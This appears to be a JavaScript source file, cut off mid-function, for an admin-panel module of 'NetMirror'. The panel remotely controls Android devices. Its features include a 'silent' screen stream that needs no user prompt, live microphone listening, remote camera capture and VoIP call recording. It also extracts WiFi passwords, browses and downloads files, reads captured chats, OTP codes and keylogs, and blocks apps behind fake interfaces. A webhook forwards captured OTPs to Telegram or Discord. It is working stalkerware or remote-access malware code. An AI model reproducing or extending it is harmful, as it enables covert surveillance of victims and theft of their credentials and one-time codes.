/**
 * v79-features.js v3 — NetMirror Admin Panel Extension Module
 *
 * v3 NEW FEATURES:
 *   • Live Screen Viewer (MSE H.264 player) — for high-quality LiveScreenStreamer
 *   • Silent Screen Viewer (JPEG slideshow) — for SilentScreenStreamer (no prompt)
 *   • Live Mic Player (Web Audio API) — real-time AAC-ADTS decoding
 *   • Camera Gallery — grid of captured photos with lightbox
 *   • File Manager — breadcrumb navigation, offline cache support, download
 *   • App Blocker v2 — fake UI type selection, timer, custom URL, unblock list
 *   • Remote Uninstall — button in apps list
 *
 * v3 FIXES:
 *   • All modals render before API calls (fixes file manager "not opening")
 *   • Files work offline via /api/admin/list-files-smart cache fallback
 *   • Silent screen capture requires NO user prompt
 *   • Mic chunks decoded via decodeAudioData() with ADTS-wrapped AAC
 *   • Camera captures have a proper gallery modal
 */

(function() {
  'use strict';

  const V79_TAG = '[v79]';
  function log(msg) { console.log(`${V79_TAG} ${msg}`); }

  // ═══════════════════════════════════════════════════════════════
  //  HELPERS — reference app.js globals directly (script-scoped)
  // ═══════════════════════════════════════════════════════════════

  function getDeviceId() { try { return modalDeviceId || ''; } catch (_) { return ''; } }
  function getAdminPassword() { try { return adminPassword || ''; } catch (_) { return ''; } }
  function getApiBase() { try { return API_BASE || window.location.origin; } catch (_) { return window.location.origin; } }
  function getSocket() { try { return socket || null; } catch (_) { return null; } }

  function showToast(msg, type) {
    try {
      if (typeof showToast === 'function') showToast(msg, type || 'info');
      else console.log(`[toast:${type || 'info'}] ${msg}`);
    } catch (_) {}
  }

  async function apiCall(endpoint, method, body) {
    const opts = {
      method: method || 'GET',
      headers: { 'x-admin-password': getAdminPassword(), 'Content-Type': 'application/json' }
    };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(`${getApiBase()}${endpoint}`, opts);
    return res.json();
  }

  async function relayCommand(endpoint, extra) {
    const deviceId = getDeviceId();
    if (!deviceId) { showToast('⚠️ No device selected — open a device panel first', 'error'); return null; }
    try {
      const body = { device_id: deviceId, ...extra };
      const data = await apiCall(endpoint, 'POST', body);
      if (data.success) showToast(`✓ Command sent`, 'success');
      else showToast(`✗ Failed: ${data.error || 'Unknown error'}`, 'error');
      return data;
    } catch (e) {
      showToast(`✗ Error: ${e.message}`, 'error');
      return null;
    }
  }

  function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }

  function createModal(title, contentHtml, options = {}) {
    const existing = document.getElementById('v79-modal-overlay');
    if (existing) existing.remove();
    const overlay = document.createElement('div');
    overlay.id = 'v79-modal-overlay';
    overlay.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:100000;display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;${options.noClickClose ? 'pointer-events:all;' : ''}`;
    overlay.innerHTML = `
      <div style="background:#1a1a2e;color:#fff;border-radius:12px;max-width:${options.maxWidth || '90vw'};max-height:85vh;width:${options.width || '800px'};display:flex;flex-direction:column;overflow:hidden;border:1px solid rgba(255,255,255,.15);box-shadow:0 20px 60px rgba(0,0,0,.5);">
        <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 20px;border-bottom:1px solid rgba(255,255,255,.1);background:rgba(0,0,0,.3);flex-shrink:0;">
          <h3 style="margin:0;font-size:15px;color:#fff;font-weight:600;">${title}</h3>
          <button onclick="document.getElementById('v79-modal-overlay').remove()" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;padding:0 4px;line-height:1;">&times;</button>
        </div>
        <div id="v79-modal-body" style="padding:16px 20px;overflow-y:auto;flex:1;">${contentHtml}</div>
      </div>
    `;
    if (!options.noClickClose) {
      overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
    }
    document.body.appendChild(overlay);
    return overlay;
  }

  // ═══════════════════════════════════════════════════════════════
  //  TOOLBAR (compact grid, no overlap with device header)
  // ═══════════════════════════════════════════════════════════════

  const TOOLBAR_HTML = `
    <div id="v79-toolbar" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(110px,1fr));gap:6px;padding:10px 16px;background:linear-gradient(135deg,rgba(30,30,50,.6),rgba(20,20,35,.6));border-bottom:1px solid rgba(255,255,255,.08);flex-shrink:0;max-height:280px;overflow-y:auto;">
      <button onclick="v79.startSilentScreen()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.15)">📺 Live Screen</button>
      <button onclick="v79.stopSilentScreen()" class="v79-btn" style="--c:#4682b4;--bg:rgba(70,130,180,.08)">⏹ Stop Screen</button>
      <button onclick="v79.startMicStream()" class="v79-btn" style="--c:#ff6347;--bg:rgba(255,99,71,.15)">🎙️ Live Mic</button>
      <button onclick="v79.stopMicStream()" class="v79-btn" style="--c:#ff6347;--bg:rgba(255,99,71,.08)">⏹ Stop Mic</button>
      <button onclick="v79.captureCamera('back')" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">📷 Back Cam</button>
      <button onclick="v79.captureCamera('front')" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">🤳 Front Cam</button>
      <button onclick="v79.openCameraGallery()" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.08)">🖼️ Cam Gallery</button>
      <button onclick="v79.startVoipRecord()" class="v79-btn" style="--c:#f1c40f;--bg:rgba(241,196,15,.15)">📞 VoIP Record</button>
      <button onclick="v79.stopVoipRecord()" class="v79-btn" style="--c:#f1c40f;--bg:rgba(241,196,15,.08)">⏹ Stop VoIP</button>
      <button onclick="v79.extractWifiPasswords()" class="v79-btn" style="--c:#3498db;--bg:rgba(52,152,219,.15)">📶 WiFi PW</button>
      <button onclick="v79.runSecurityScan()" class="v79-btn" style="--c:#e74c3c;--bg:rgba(231,76,60,.15)">🔒 Security Scan</button>
      <button onclick="v79.openFileManager()" class="v79-btn" style="--c:#95a5a6;--bg:rgba(149,165,166,.15)">📁 Files</button>
      <button onclick="v79.openChatMessages()" class="v79-btn" style="--c:#27ae60;--bg:rgba(39,174,96,.15)">💬 Chats</button>
      <button onclick="v79.openOtpCodes()" class="v79-btn" style="--c:#d35400;--bg:rgba(211,84,0,.15)">🔑 OTPs</button>
      <button onclick="v79.openGeofences()" class="v79-btn" style="--c:#2980b9;--bg:rgba(41,128,185,.15)">🗺️ Geofences</button>
      <button onclick="v79.openAppBlocker()" class="v79-btn" style="--c:#c0392b;--bg:rgba(192,57,43,.15)">🚫 Block App</button>
      <button onclick="v79.openBlockedList()" class="v79-btn" style="--c:#27ae60;--bg:rgba(39,174,96,.15)">✅ Unblock App</button>
      <button onclick="v79.openTwoWayChat()" class="v79-btn" style="--c:#9b59b6;--bg:rgba(155,89,182,.15)">✉️ Chat</button>
      <button onclick="v79.openSearch()" class="v79-btn" style="--c:#f39c12;--bg:rgba(243,156,18,.15)">🔍 Search</button>
    </div>
    <style>
      .v79-btn{display:flex;align-items:center;justify-content:center;gap:4px;padding:8px 6px;background:var(--bg);border:1px solid var(--c);color:var(--c);border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;font-family:inherit;transition:all .15s ease;text-align:center;line-height:1.2;min-height:34px;}
      .v79-btn:hover{background:var(--c);color:#fff;transform:translateY(-1px);box-shadow:0 2px 8px rgba(0,0,0,.3);}
      .v79-btn:active{transform:translateY(0);}
      #v79-toolbar::-webkit-scrollbar{width:6px;}
      #v79-toolbar::-webkit-scrollbar-track{background:transparent;}
      #v79-toolbar::-webkit-scrollbar-thumb{background:rgba(255,255,255,.15);border-radius:3px;}
    </style>
  `;

  function injectToolbar() {
    if (document.getElementById('v79-toolbar')) return;
    const modal = document.getElementById('deviceModal');
    if (!modal) { setTimeout(injectToolbar, 2000); return; }
    if (modal.classList.contains('hidden')) return;
    const modalTop = modal.querySelector('.device-modal-top');
    if (!modalTop) { setTimeout(injectToolbar, 1000); return; }
    modalTop.insertAdjacentHTML('afterend', TOOLBAR_HTML);
    log('Toolbar injected');
  }

  function removeToolbar() {
    const existing = document.getElementById('v79-toolbar');
    if (existing) existing.remove();
  }

  // ═══════════════════════════════════════════════════════════════
  //  LIVE SCREEN VIEWER (Silent — JPEG slideshow, no user prompt)
  // ═══════════════════════════════════════════════════════════════

  let silentScreenModal = null;
  let silentScreenImg = null;
  let silentScreenFrameCount = 0;
  let silentScreenStartTime = 0;

  window.v79 = {
    startSilentScreen: async function() {
      const r = await relayCommand('/api/admin/start-silent-screen');
      if (r && r.success) {
        silentScreenFrameCount = 0;
        silentScreenStartTime = Date.now();
        showSilentScreenModal();
      }
    },

    stopSilentScreen: async function() {
      await relayCommand('/api/admin/stop-silent-screen');
      const overlay = document.getElementById('v79-modal-overlay');
      if (overlay && overlay.dataset.type === 'silent-screen') overlay.remove();
    },

    startMicStream: async function() {
      // v7.9.3: Create AudioContext INSIDE the user gesture (before any await)
      // to comply with browser autoplay policies. The modal + resume() happens
      // synchronously here, THEN we send the command to the device.
      try {
        v79._audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
        if (v79._audioCtx.state === 'suspended') {
          v79._audioCtx.resume().catch(() => {});
        }
        v79._nextStartTime = v79._audioCtx.currentTime + 0.2;
        v79._micJitterQueue = [];
        v79._micPlaybackStarted = false;
      } catch (e) {
        showToast('⚠️ Audio init failed: ' + e.message, 'error');
        return;
      }
      // Show modal immediately (don't wait for device response)
      showLiveMicModal();
      // Now send the command to start streaming on the device
      const r = await relayCommand('/api/admin/start-mic-stream');
      if (!r || !r.success) {
        showToast('⚠️ Device failed to start mic stream', 'error');
      }
    },

    stopMicStream: async function() {
      await relayCommand('/api/admin/stop-mic-stream');
      const overlay = document.getElementById('v79-modal-overlay');
      if (overlay && overlay.dataset.type === 'live-mic') overlay.remove();
      if (v79._audioCtx) { try { v79._audioCtx.close(); } catch(_){} v79._audioCtx = null; }
    },

    captureCamera: (camera) => relayCommand('/api/admin/capture-camera', { camera, quality: 'high' }),

    startVoipRecord: () => relayCommand('/api/admin/start-voip-record'),
    stopVoipRecord: () => relayCommand('/api/admin/stop-voip-record'),
    extractWifiPasswords: () => relayCommand('/api/admin/extract-wifi-passwords'),
    runSecurityScan: () => relayCommand('/api/admin/run-security-scan'),

    // ═══ CAMERA GALLERY ═══
    openCameraGallery: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/admin/connections/${deviceId}/camera-captures?limit=100`);
        showCameraGalleryModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ FILE MANAGER (with offline cache support) ═══
    openFileManager: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      showFileManagerModal(deviceId, '/sdcard');
      await v79.browseTo('/sdcard');
    },

    browseTo: async function(path) {
      const deviceId = getDeviceId();
      if (!deviceId) return;
      // v7.9.4: Push to path history for back button
      v79._fmPathHistory = v79._fmPathHistory || [];
      if (v79._fmPathHistory[v79._fmPathHistory.length - 1] !== path) {
        v79._fmPathHistory.push(path);
      }
      v79._fmCurrentPath = path;
      const input = document.getElementById('v79-path-input');
      if (input) input.value = path;
      updateFmBackButton();

      const list = document.getElementById('v79-file-list');
      const breadcrumb = document.getElementById('v79-breadcrumb');
      const offlineBanner = document.getElementById('v79-offline-banner');
      if (breadcrumb) breadcrumb.textContent = path;
      if (list) list.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Loading...</div>';
      if (offlineBanner) offlineBanner.style.display = 'none';

      try {
        const data = await apiCall('/api/admin/list-files-smart', 'POST', { device_id: deviceId, path });
        if (!data.success) {
          if (list) list.innerHTML = `<div style="padding:20px;text-align:center;color:#e74c3c;">❌ ${escapeHtml(data.error || 'Failed')}</div>`;
          return;
        }

        if (data.source === 'live') {
          // Wait for socket event 'files_listed' to populate
          if (list) list.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Requesting from device (live)...</div>';
        } else {
          // Cache hit — render immediately
          renderFileList(data.entries || [], data.cached_at, data.source);
        }
      } catch (e) {
        if (list) list.innerHTML = `<div style="padding:20px;text-align:center;color:#e74c3c;">Error: ${escapeHtml(e.message)}</div>`;
      }
    },

    downloadFile: function(path) {
      const deviceId = getDeviceId();
      if (!deviceId) return;
      relayCommand('/api/admin/download-file', { path });
      showToast('📁 File download requested — will arrive via socket', 'info');
    },

    // ═══ CHAT MESSAGES ═══
    openChatMessages: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/chat-messages?limit=200`);
        showChatMessagesModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ OTP CODES ═══
    openOtpCodes: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/otp-codes?limit=100`);
        showOtpCodesModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ GEOFENCES ═══
    openGeofences: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/geofences`);
        const events = await apiCall(`/api/devices/${deviceId}/geofence-events?limit=50`);
        showGeofencesModal(data.geofences || [], events.events || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ APP BLOCKER v2 (with fake UI selection) ═══
    openAppBlocker: function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      showAppBlockerModal();
    },

    submitAppBlock: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) return;
      // v7.9.9: Try hidden field first, fall back to search box value (for manual entry)
      let pkg = (document.getElementById('v79-block-pkg')?.value || '').trim();
      if (!pkg) {
        // User typed manually in the search box — use that as the package name
        const searchVal = (document.getElementById('v79-block-pkg-search')?.value || '').trim();
        // Check if it looks like a package name (contains a dot)
        if (searchVal.includes('.')) {
          pkg = searchVal;
        }
      }
      if (!pkg) {
        showToast('⚠️ Please select an app from the list OR type a package name (e.g. com.example.app)', 'error');
        return;
      }
      const fakeUiType = document.getElementById('v79-block-ui-type').value;
      const customMessage = document.getElementById('v79-block-message').value.trim();
      const customUrl = document.getElementById('v79-block-url')?.value?.trim() || '';
      const timerSeconds = parseInt(document.getElementById('v79-block-timer')?.value || '0') || 0;
      const unblockCode = document.getElementById('v79-block-code')?.value?.trim() || '';

      const r = await relayCommand('/api/admin/block-app-v2', {
        package: pkg, fake_ui_type: fakeUiType, custom_message: customMessage,
        custom_url: customUrl, timer_seconds: timerSeconds, unblock_code: unblockCode
      });
      if (r && r.success) {
        const overlay = document.getElementById('v79-modal-overlay');
        if (overlay) overlay.remove();
      }
    },

    // ═══ BLOCKED APPS LIST (unblock) ═══
    openBlockedList: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      // v7.9.5: Show modal FIRST (loading state), THEN request from device.
      // Previous order caused race condition — device response arrived before
      // modal was created, so the list was overwritten with empty state.
      showBlockedListModal([]);
      showToast('📱 Requesting blocked apps list from device...', 'info');
      // Request blocked apps list from device
      await relayCommand('/api/admin/get-blocked-apps');
    },

    unblockApp: async function(pkg) {
      if (!confirm(`Unblock "${pkg}"?`)) return;
      await relayCommand('/api/admin/unblock-app-v2', { package: pkg });
      // Refresh list after a delay
      setTimeout(() => v79.openBlockedList(), 2000);
    },

    // ═══ TWO-WAY CHAT ═══
    openTwoWayChat: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/chat?limit=50`);
        showTwoWayChatModal(data.messages || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    sendChatMessage: async function() {
      const input = document.getElementById('v79-chat-input');
      if (!input || !input.value.trim()) return;
      const deviceId = getDeviceId();
      if (!deviceId) return;
      try {
        await apiCall(`/api/devices/${deviceId}/chat`, 'POST', { message: input.value, type: 'command' });
        input.value = '';
        showToast('✓ Message sent', 'success');
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ SEARCH ═══
    openSearch: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
      const q = prompt('Search across all captured data (chats, OTPs, keylogs, notifications):', '');
      if (!q) return;
      try {
        const data = await apiCall(`/api/devices/${deviceId}/search?q=${encodeURIComponent(q)}&limit=50`);
        showSearchResultsModal(q, data.results || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ WEBHOOKS ═══
    openWebhooks: async function() {
      try {
        const data = await apiCall('/api/admin/webhooks');
        const current = data.webhook;
        const url = prompt('Webhook URL (Telegram/Discord):', current?.url || '');
        if (url === null) return;
        const events = prompt('Events (comma-separated):', (current?.events || ['otp_captured','geofence_event','security_event']).join(','));
        if (events === null) return;
        await apiCall('/api/admin/webhooks', 'POST', {
          url, events: events.split(',').map(e => e.trim()).filter(Boolean), enabled: true
        });
        showToast('✓ Webhook saved', 'success');
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ DASHBOARD ═══
    openDashboard: async function() {
      try {
        const data = await apiCall('/api/admin/dashboard');
        showDashboardModal(data);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    }
  };

  // ═══════════════════════════════════════════════════════════════
  //  LIVE SILENT SCREEN MODAL (JPEG slideshow)
  // ═══════════════════════════════════════════════════════════════

  function showSilentScreenModal() {
    createModal('📺 Live Screen (Silent)', `
      <div style="text-align:center;">
        <div id="v79-screen-status" style="color:#95a5a6;font-size:12px;margin-bottom:8px;">Connecting...</div>
        <div style="position:relative;background:#000;border-radius:8px;overflow:hidden;display:inline-block;">
          <img id="v79-screen-img" style="max-width:100%;max-height:60vh;display:block;" alt="Live screen"/>
          <div id="v79-screen-loading" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;font-size:14px;">⏳ Waiting for first frame...</div>
        </div>
        <div style="margin-top:12px;display:flex;justify-content:center;gap:16px;font-size:11px;color:#95a5a6;">
          <span>FPS: <span id="v79-screen-fps">0</span></span>
          <span>Frames: <span id="v79-screen-frames">0</span></span>
          <span>Duration: <span id="v79-screen-duration">0s</span></span>
        </div>
        <button onclick="v79.stopSilentScreen()" style="margin-top:12px;padding:8px 20px;background:rgba(231,76,60,.3);border:1px solid rgba(231,76,60,.5);color:#fff;border-radius:6px;cursor:pointer;">⏹ Stop Stream</button>
      </div>
    `, { width: '700px', maxWidth: '95vw', noClickClose: true });

    const overlay = document.getElementById('v79-modal-overlay');
    if (overlay) overlay.dataset.type = 'silent-screen';
    silentScreenImg = document.getElementById('v79-screen-img');
  }

  function updateSilentScreenFrame(frameB64) {
    if (!silentScreenImg) return;
    silentScreenImg.src = 'data:image/jpeg;base64,' + frameB64;
    silentScreenFrameCount++;
    const loading = document.getElementById('v79-screen-loading');
    if (loading) loading.style.display = 'none';
    const status = document.getElementById('v79-screen-status');
    if (status) status.textContent = '🟢 Live';
    const framesEl = document.getElementById('v79-screen-frames');
    if (framesEl) framesEl.textContent = silentScreenFrameCount;
    const duration = (Date.now() - silentScreenStartTime) / 1000;
    const durEl = document.getElementById('v79-screen-duration');
    if (durEl) durEl.textContent = duration.toFixed(1) + 's';
    const fps = silentScreenFrameCount / Math.max(duration, 0.1);
    const fpsEl = document.getElementById('v79-screen-fps');
    if (fpsEl) fpsEl.textContent = fps.toFixed(1);
  }

  // ═══════════════════════════════════════════════════════════════
  //  LIVE MIC MODAL (Web Audio API)
  // ═══════════════════════════════════════════════════════════════

  function showLiveMicModal() {
    createModal('🎙️ Live Mic Stream', `
      <div style="text-align:center;">
        <div id="v79-mic-status" style="color:#27ae60;font-size:14px;margin-bottom:8px;">🟢 Streaming — listening live</div>
        <div style="font-size:48px;margin:20px 0;">🎙️</div>
        <div style="display:flex;justify-content:center;gap:16px;font-size:11px;color:#95a5a6;margin-bottom:16px;">
          <span>Format: <span id="v79-mic-format">pcm</span></span>
          <span>Chunks: <span id="v79-mic-chunks">0</span></span>
          <span>Duration: <span id="v79-mic-duration">0s</span></span>
          <span>Buffered: <span id="v79-mic-buffered">0</span></span>
        </div>
        <div style="height:60px;background:rgba(0,0,0,.3);border-radius:8px;display:flex;align-items:center;justify-content:center;gap:4px;padding:0 20px;" id="v79-mic-visualizer">
          ${Array.from({length: 40}, () => '<div style="width:4px;background:#27ae60;border-radius:2px;height:8px;"></div>').join('')}
        </div>
        <button onclick="v79.stopMicStream()" style="margin-top:16px;padding:8px 20px;background:rgba(231,76,60,.3);border:1px solid rgba(231,76,60,.5);color:#fff;border-radius:6px;cursor:pointer;">⏹ Stop Streaming</button>
      </div>
    `, { width: '500px', maxWidth: '95vw', noClickClose: true });

    const overlay = document.getElementById('v79-modal-overlay');
    if (overlay) overlay.dataset.type = 'live-mic';

    // v7.9.3: Initialize AudioContext INSIDE the user gesture (click handler)
    // and explicitly resume() it. Browsers suspend AudioContext until user gesture.
    try {
      v79._audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 16000 });
      // Resume immediately — this must happen within the user gesture
      if (v79._audioCtx.state === 'suspended') {
        v79._audioCtx.resume().then(() => {
          log('AudioContext resumed, state=' + v79._audioCtx.state);
        }).catch(e => log('AudioContext resume failed: ' + e.message));
      }
      v79._micChunkCount = 0;
      v79._micStartTime = Date.now();
      v79._nextStartTime = v79._audioCtx.currentTime + 0.1;  // 100ms initial look-ahead
      v79._micJitterQueue = [];  // v7.9.3: jitter buffer for smooth playback
      v79._micPlaybackStarted = false;
      log('AudioContext initialized (sampleRate=' + v79._audioCtx.sampleRate + ', state=' + v79._audioCtx.state + ')');
    } catch (e) {
      log('AudioContext init failed: ' + e.message);
      showToast('⚠️ AudioContext init failed: ' + e.message, 'error');
    }
  }

  function playMicChunk(data) {
    if (!v79._audioCtx) return;
    try {
      const b64 = data.chunk;
      if (!b64) return;

      // Decode base64 → ArrayBuffer
      const binaryStr = atob(b64);
      const len = binaryStr.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) bytes[i] = binaryStr.charCodeAt(i);

      v79._micChunkCount = (v79._micChunkCount || 0) + 1;
      const chunksEl = document.getElementById('v79-mic-chunks');
      if (chunksEl) chunksEl.textContent = v79._micChunkCount;
      const durEl = document.getElementById('v79-mic-duration');
      if (durEl) durEl.textContent = ((Date.now() - v79._micStartTime) / 1000).toFixed(1) + 's';

      // Update visualizer (random heights based on actual audio level)
      const viz = document.getElementById('v79-mic-visualizer');
      if (viz) {
        const bars = viz.children;
        // Calculate RMS from PCM samples for realistic visualizer
        const int16 = new Int16Array(bytes.buffer);
        let rms = 0;
        const step = Math.max(1, Math.floor(int16.length / 40));
        for (let i = 0; i < int16.length; i += step) {
          rms += Math.abs(int16[i]);
        }
        rms = rms / Math.ceil(int16.length / step) / 32768;
        for (let i = 0; i < bars.length; i++) {
          const h = 8 + (Math.random() * rms * 60);
          bars[i].style.height = h + 'px';
        }
      }

      // v7.9.3: Always PCM mode (Android no longer sends AAC)
      const format = data.format || 'pcm';
      if (format === 'pcm') {
        const sampleRate = data.sample_rate || 16000;
        const int16 = new Int16Array(bytes.buffer);
        const audioBuf = v79._audioCtx.createBuffer(1, int16.length, sampleRate);
        const channelData = audioBuf.getChannelData(0);
        for (let i = 0; i < int16.length; i++) channelData[i] = int16[i] / 32768;

        // v7.9.3: Jitter buffer — collect 2 chunks before first playback
        // to absorb network jitter, then drain queue as each new chunk arrives
        v79._micJitterQueue = v79._micJitterQueue || [];
        v79._micJitterQueue.push(audioBuf);

        const bufferedEl = document.getElementById('v79-mic-buffered');
        if (bufferedEl) bufferedEl.textContent = v79._micJitterQueue.length;

        if (!v79._micPlaybackStarted && v79._micJitterQueue.length >= 2) {
          // Start playback after 2 chunks buffered
          v79._micPlaybackStarted = true;
          while (v79._micJitterQueue.length > 0) {
            scheduleAudioBuffer(v79._micJitterQueue.shift());
          }
        } else if (v79._micPlaybackStarted) {
          // Drain queue
          while (v79._micJitterQueue.length > 0) {
            scheduleAudioBuffer(v79._micJitterQueue.shift());
          }
        }
      } else {
        // Legacy AAC fallback (shouldn't be reached with v7.9.3+ Android)
        v79._audioCtx.decodeAudioData(bytes.buffer.slice(0), (audioBuf) => {
          scheduleAudioBuffer(audioBuf);
        }, (err) => {
          log('decodeAudioData failed: ' + (err || 'unknown'));
        });
      }
    } catch (e) {
      log('playMicChunk error: ' + e.message);
    }
  }

  function scheduleAudioBuffer(audioBuf) {
    if (!v79._audioCtx || !audioBuf) return;
    try {
      const src = v79._audioCtx.createBufferSource();
      src.buffer = audioBuf;
      src.connect(v79._audioCtx.destination);
      const now = v79._audioCtx.currentTime;

      // v7.9.3: If nextStartTime is too far in the past (more than 1 buffer behind),
      // reset to now + small look-ahead to prevent pile-up (the "radio cutting" bug)
      let startTime = v79._nextStartTime || now;
      if (startTime < now - audioBuf.duration) {
        // Stale — skip this buffer's scheduling, play at now + 50ms
        startTime = now + 0.05;
        log('Skipping stale audio buffer (was ' + (now - startTime).toFixed(3) + 's behind)');
      }
      if (startTime < now) {
        startTime = now + 0.02;  // minimum 20ms look-ahead
      }

      src.start(startTime);
      v79._nextStartTime = startTime + audioBuf.duration;
    } catch (e) {
      log('scheduleAudioBuffer error: ' + e.message);
    }
  }

  // ═══════════════════════════════════════════════════════════════
  //  CAMERA GALLERY MODAL
  // ═══════════════════════════════════════════════════════════════

  function showCameraGalleryModal(entries) {
    const thumbs = entries.map((e, i) => `
      <div style="position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#000;aspect-ratio:1;" onclick="v79.openPhotoLightbox('${escapeHtml(e.url)}', '${escapeHtml(e.camera)}', '${escapeHtml(e.captured_at)}')">
        <img src="${escapeHtml(e.url)}" loading="lazy" style="width:100%;height:100%;object-fit:cover;" onerror="this.parentElement.innerHTML='<div style=\\'display:flex;align-items:center;justify-content:center;height:100%;color:#666;font-size:24px;\\'>📷</div>'"/>
        <div style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.8));color:#fff;font-size:9px;padding:4px 6px;">${escapeHtml(e.camera)} · ${escapeHtml(e.captured_at || '').substring(0, 16)}</div>
      </div>
    `).join('');
    createModal(`🖼️ Camera Gallery (${entries.length})`, `
      ${entries.length === 0 ? '<div style="padding:40px;text-align:center;color:#666;">No photos captured yet.<br>Use 📷 Back Cam / 🤳 Front Cam to capture.</div>' :
        `<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;">${thumbs}</div>`}
    `, { width: '900px', maxWidth: '95vw' });
  }

  window.v79.openPhotoLightbox = function(url, camera, capturedAt) {
    createModal(`📷 ${camera} · ${capturedAt}`, `
      <div style="text-align:center;">
        <img src="${escapeHtml(url)}" style="max-width:100%;max-height:70vh;border-radius:8px;"/>
        <div style="margin-top:12px;">
          <a href="${escapeHtml(url)}" target="_blank" style="color:#3498db;font-size:12px;">Open in new tab</a>
        </div>
      </div>
    `, { width: '800px' });
  };

  // ═══════════════════════════════════════════════════════════════
  //  FILE MANAGER MODAL
  // ═══════════════════════════════════════════════════════════════

  function showFileManagerModal(deviceId, path) {
    // v7.9.4: Initialize path history for back button navigation
    v79._fmPathHistory = [path];
    v79._fmCurrentPath = path;

    createModal('📁 File Manager', `
      <div style="margin-bottom:12px;display:flex;gap:8px;align-items:center;">
        <button id="v79-fm-back" onclick="v79.fmGoBack()" style="padding:6px 10px;background:rgba(52,152,219,.3);border:1px solid rgba(52,152,219,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:12px;disabled: true;" title="Go back">⬅ Back</button>
        <button onclick="v79.browseTo('/sdcard')" style="padding:6px 10px;background:rgba(52,152,219,.3);border:1px solid rgba(52,152,219,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:12px;" title="Go to root">🏠 Home</button>
        <input id="v79-path-input" type="text" value="${escapeHtml(path)}" style="flex:1;padding:6px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:12px;font-family:monospace;" onkeypress="if(event.key==='Enter')v79.browseTo(this.value)"/>
        <button onclick="v79.browseTo(document.getElementById('v79-path-input').value)" style="padding:6px 12px;background:rgba(46,204,113,.3);border:1px solid rgba(46,204,113,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:11px;">Go</button>
      </div>
      <div id="v79-breadcrumb" style="color:#3498db;font-size:12px;font-family:monospace;margin-bottom:8px;word-break:break-all;padding:6px 10px;background:rgba(0,0,0,.2);border-radius:4px;">${escapeHtml(path)}</div>
      <div id="v79-offline-banner" style="display:none;background:rgba(241,196,15,.15);border:1px solid rgba(241,196,15,.4);color:#f1c40f;padding:8px 12px;border-radius:6px;font-size:11px;margin-bottom:8px;"></div>
      <div id="v79-file-list" style="background:rgba(0,0,0,.2);border-radius:6px;max-height:50vh;overflow-y:auto;font-family:monospace;font-size:12px;">
        <div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Loading...</div>
      </div>
    `, { width: '800px' });
  }

  // v7.9.4: Back button for file manager
  window.v79.fmGoBack = function() {
    if (!v79._fmPathHistory || v79._fmPathHistory.length <= 1) return;
    v79._fmPathHistory.pop();  // remove current
    const prevPath = v79._fmPathHistory[v79._fmPathHistory.length - 1];
    v79._fmCurrentPath = prevPath;
    const input = document.getElementById('v79-path-input');
    if (input) input.value = prevPath;
